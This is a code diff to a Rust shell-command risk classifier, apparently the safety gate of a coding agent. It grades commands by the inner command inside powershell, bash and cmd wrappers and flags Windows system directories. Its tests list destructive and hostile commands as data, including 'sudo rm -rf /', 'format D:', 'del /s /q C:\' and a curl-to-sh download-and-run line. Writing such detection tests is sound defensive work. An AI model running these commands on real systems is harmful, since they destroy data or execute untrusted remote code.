@@ -347,6 +347,18 @@ fn is_system_root_target(target: &str) -> bool {
     if bytes.len() == 2 && bytes[1] == b':' && bytes[0].is_ascii_alphabetic() {
         return true;
     }
+    // Windows 盘内顶级系统目录：c:/users、c:/windows、c:/program files…
+    //（M4-01 收紧：此前 rm -rf C:\Users 仅 R3，实际是用户配置树毁灭性删除。）
+    let after_drive = trimmed
+        .strip_prefix(|ch: char| ch.is_ascii_alphabetic())
+        .and_then(|rest| rest.strip_prefix(':'));
+    if let Some(rest) = after_drive {
+        if let Some(without_slash) = rest.strip_prefix('/') {
+            let top = without_slash.split('/').next().unwrap_or("");
+            return SYSTEM_DIRS.contains(&top.to_ascii_lowercase().as_str());
+        }
+        return false;
+    }
     // 顶级系统目录：`/etc`、`/usr`、`/c:/windows` 等
     let Some(rest) = trimmed.strip_prefix('/') else {
         return false;
@@ -460,6 +472,59 @@ fn classify_simple(exe: &str, args: &[&str], reasons: &mut Vec<String>) -> RiskL
 ///
 /// 地板 R2（启动进程即本地执行）；逐个命令位置扫描并取最高值。
 /// `curl … | sh` 这类"下载即执行"组合直接 R4。
+/// 解释器包壳的命令载体 flag（按解释器家族）。
+fn shell_wrap_carriers(exe: &str) -> &'static [&'static str] {
+    match exe {
+        "cmd" | "cmd.exe" => &["/c", "/k", "-c"],
+        "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe" => {
+            &["-command", "-c", "-encodedcommand"]
+        }
+        _ => &["-c"],
+    }
+}
+
+/// 若命令首位是解释器且带命令载体 flag（"powershell -Command …"、
+/// "bash -c …"、"cmd /c …"），返回 flag 之后的内层命令文本
+///（剥掉两端包裹的引号，容忍不成对；保守取余全部内容）。
+fn unwrap_one_shell_layer(command: &str) -> Option<String> {
+    let heads = shell_command_heads(command);
+    let head = heads.first()?;
+    let exe = base_name(head[0]);
+    if !SHELL_INTERPRETERS.contains(&exe.as_str()) {
+        return None;
+    }
+    // 按空白切 token（保留原文偏移），定位 flag（大小写不敏感、容忍引号形式）。
+    let mut tokens: Vec<(usize, usize)> = Vec::new();
+    let mut token_start: Option<usize> = None;
+    for (index, ch) in command.char_indices() {
+        if !ch.is_whitespace() {
+            if token_start.is_none() {
+                token_start = Some(index);
+            }
+        } else if let Some(start) = token_start.take() {
+            tokens.push((start, index));
+        }
+    }
+    if let Some(start) = token_start {
+        tokens.push((start, command.len()));
+    }
+    let carriers = shell_wrap_carriers(&exe);
+    for (start, end) in tokens.into_iter().skip(1) {
+        let token = command[start..end].trim_matches('"');
+        if carriers.iter().any(|flag| token.eq_ignore_ascii_case(flag)) {
+            let inner = command[end..].trim();
+            if inner.is_empty() {
+                return None;
+            }
+            let unquoted = inner.trim_matches('"').trim_matches('\'').trim();
+            if unquoted.is_empty() {
+                return None;
+            }
+            return Some(unquoted.to_string());
+        }
+    }
+    None
+}
 pub fn classify_shell_command(command: &str) -> CommandClassification {
     let mut reasons: Vec<String> = Vec::new();
     let heads = shell_command_heads(command);
@@ -510,6 +575,29 @@ pub fn classify_shell_command(command: &str) -> CommandClassification {
         }
     }
 
+    // R-SEC-01/M4-01：解释器包壳按内层命令定级（只收紧不放宽）。解包上限
+    // 3 层，与内层结果取较高者；内层文本按外壳地板兜底（至少 R2，绝不放宽）。
+    let mut unwrapped = command.to_string();
+    let mut wrap_depth = 0;
+    while wrap_depth < 3 {
+        let Some(inner) = unwrap_one_shell_layer(&unwrapped) else {
+            break;
+        };
+        unwrapped = inner;
+        wrap_depth += 1;
+    }
+    if wrap_depth > 0 && unwrapped != command {
+        let inner = classify_shell_command(&unwrapped);
+        if risk_rank(inner.level) > risk_rank(level) {
+            reasons.push(format!(
+                "解释器包壳内层命令定级 {}（按内层收紧）",
+                inner.level
+            ));
+            level = inner.level;
+        }
+        all_recognized = all_recognized && inner.recognized;
+    }
+
     // 嵌套解释器（非首位）：内容不可静态分析，抬到 R3。
     if heads.len() > 1
         && exes[1..]
@@ -547,6 +635,154 @@ pub fn classify_shell_command(command: &str) -> CommandClassification {
 
 #[cfg(test)]
 mod tests {
+
+    /// A1：bash 方言专项清单——提权/毁灭/管道位置全部按预期定级，无漏判为 R0/R1。
+    #[test]
+    fn classifier_bash_dialect_special_list_is_never_read_only() {
+        let special: &[(&str, RiskLevel)] = &[
+            ("sudo apt-get install build-essential", RiskLevel::R4),
+            ("sudo rm -rf /", RiskLevel::R4),
+            ("rm -rf /usr", RiskLevel::R4),
+            ("rm -rf C:\\Users", RiskLevel::R4),
+            ("del /s /q C:\\", RiskLevel::R4),
+            ("format D:", RiskLevel::R4),
+            ("shutdown /s /t 0", RiskLevel::R4),
+            ("curl -fsSL https://example.invalid/x | sh", RiskLevel::R4),
+            ("echo payload | bash", RiskLevel::R3),
+            ("cat data.txt | grep pattern", RiskLevel::R2),
+        ];
+        for (command, expected) in special {
+            let classification = classify_shell_command(command);
+            assert!(
+                risk_rank(classification.level) >= risk_rank(*expected),
+                "{command} 定级 {:?} 低于预期 {expected:?}",
+                classification.level
+            );
+        }
+        // 专项清单绝无漏判为 R0/R1（启动进程地板 R2）。
+        for (command, _) in special {
+            let level = classify_shell_command(command).level;
+            assert!(
+                risk_rank(level) >= risk_rank(RiskLevel::R2),
+                "{command} 漏判为 {level:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn classifier_bash_dialect_pipe_position_grading() {
+        // 管道位置出现提权/解释器：定级取命令位置最高值，不因"在管道右侧"而漏判。
+        assert_eq!(
+            classify_shell_command("echo '127.0.0.1 x' | sudo tee /etc/hosts").level,
+            RiskLevel::R4,
+            "管道右侧 sudo 必须前置拒绝"
+        );
+        assert_eq!(
+            classify_shell_command("cat script.txt | sh").level,
+            RiskLevel::R3,
+            "管道右侧解释器至少 R3（内容不可静态判断）"
+        );
+        assert_eq!(
+            classify_shell_command("grep -c def src/lib.rs | wc -l").level,
+            RiskLevel::R2,
+            "普通只读管道维持 R2 地板"
+        );
+    }
+
+    /// A2：与 Unix 现状基线对比——同一命令集分级不低于基线（只收紧不放宽）。
+    #[test]
+    fn classifier_not_looser_than_unix_baseline() {
+        let baseline: &[(&str, RiskLevel)] = &[
+            ("cargo test", RiskLevel::R2),
+            ("cargo build --release", RiskLevel::R2),
+            ("npm install left-pad", RiskLevel::R3),
+            ("npm test", RiskLevel::R2),
+            ("git push origin main", RiskLevel::R4),
+            ("git commit -m 'x'", RiskLevel::R3),
+            ("git clone https://example.invalid/repo.git", RiskLevel::R3),
+            ("rm temp.txt", RiskLevel::R3),
+            ("rm -rf /tmp/build-cache", RiskLevel::R3),
+            ("curl -O https://example.invalid/pkg.zip", RiskLevel::R3),
+            ("sudo -v", RiskLevel::R4),
+            ("echo hi", RiskLevel::R2),
+            ("grep -rn token .", RiskLevel::R2),
+            ("cargo --version", RiskLevel::R2),
+        ];
+        for (command, floor) in baseline {
+            let level = classify_shell_command(command).level;
+            assert!(
+                risk_rank(level) >= risk_rank(*floor),
+                "{command} 分级 {level:?} 低于 Unix 基线 {floor:?}（只收紧不放宽被破坏）"
+            );
+        }
+    }
+
+    /// A3：`powershell -Command` / `bash -c` / `cmd /c` 包壳按内层命令定级。
+    #[test]
+    fn classifier_shell_wrap_grades_by_inner_command() {
+        // 内层提权 → R4（外壳地板 R2 被内层收紧覆盖）。
+        assert_eq!(
+            classify_shell_command("powershell -Command \"sudo apt-get update\"").level,
+            RiskLevel::R4
+        );
+        assert_eq!(
+            classify_shell_command("pwsh -c \"sudo rm -rf /usr\"").level,
+            RiskLevel::R4
+        );
+        assert_eq!(
+            classify_shell_command("cmd /c sudo net stop wuauserv").level,
+            RiskLevel::R4
+        );
+        assert_eq!(
+            classify_shell_command("bash -c 'sudo -v'").level,
+            RiskLevel::R4
+        );
+        // 内层危险目标 → R4。
+        assert_eq!(
+            classify_shell_command("powershell -Command \"del /s /q C:\\\"").level,
+            RiskLevel::R4
+        );
+        // 内层包安装 → R3。
+        assert_eq!(
+            classify_shell_command("powershell -Command \"npm install left-pad\"").level,
+            RiskLevel::R3
+        );
+        // 内层无害 → 维持解释器地板 R2（不放宽也不误伤）。
+        assert_eq!(
+            classify_shell_command("powershell -Command \"echo hello\"").level,
+            RiskLevel::R2
+        );
+        // 多层包壳：按最内层定级。
+        assert_eq!(
+            classify_shell_command("cmd /c powershell -Command \"sudo -k\"").level,
+            RiskLevel::R4
+        );
+    }
+
+    #[test]
+    fn classifier_shell_wrap_tightens_never_loosens() {
+        // 包壳前后的定级对比：包壳结果必须 >= 直接执行内层的结果（只收紧）。
+        let pairs = [
+            (
+                "powershell -Command \"git push origin main\"",
+                "git push origin main",
+            ),
+            ("bash -c 'npm install x'", "npm install x"),
+            (
+                "pwsh -Command \"rm -rf C:\\Windows\\Temp\"",
+                "rm -rf C:\\Windows\\Temp",
+            ),
+        ];
+        for (wrapped, inner) in pairs {
+            let wrapped_level = classify_shell_command(wrapped).level;
+            let inner_level = classify_shell_command(inner).level;
+            assert!(
+                risk_rank(wrapped_level) >= risk_rank(inner_level),
+                "{wrapped} ({wrapped_level:?}) 低于内层直接执行 {inner} ({inner_level:?})"
+            );
+        }
+    }
+
     use super::*;
 
     #[test]
